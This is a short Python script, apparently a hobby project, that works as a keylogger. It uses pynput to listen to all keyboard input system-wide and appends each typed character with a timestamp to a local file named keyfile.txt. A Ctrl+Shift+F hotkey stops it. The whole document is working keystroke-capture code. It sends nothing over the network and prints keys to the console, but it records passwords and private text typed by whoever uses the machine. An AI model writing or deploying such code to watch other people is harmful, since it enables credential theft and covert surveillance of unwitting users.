import os
from pynput import keyboard
import datetime


def time_taker():
    date = datetime.date(2025, 1, 3)
    today = datetime.date.today()
    time = datetime.time(12, 30, 34)
    now = datetime.datetime.now()
    now = now.strftime("%H:%M:%S--%d/%m/%Y")
    return now


def keypressed(key):
    # writes the key to the file
    # parameter: key: the key to write
    # returns: None
    print(str(key))
    with (open("keyfile.txt", 'a')as logkey):
        try:
            char=key.char
            now=time_taker()
            #print(now)
            #logkey.write(char,now)
            #logkey.write(char+now)
            logkey.write(now+":"+char+"\n")
        except:
            print("error getting char")

def kill_the_process():
    """when <ctrl>+<shift>+f pressed the func kill the process"""
    os._exit(0)


def listiner():
    listener=keyboard.Listener(on_press=keypressed)
    listener.start()
    keyboard.GlobalHotKeys({'<ctrl>+<shift>+f': kill_the_process}).start()
    while True:
        pass

if __name__=="__main__":
   # print(keypressed)
   # print(time_taker)
   listiner()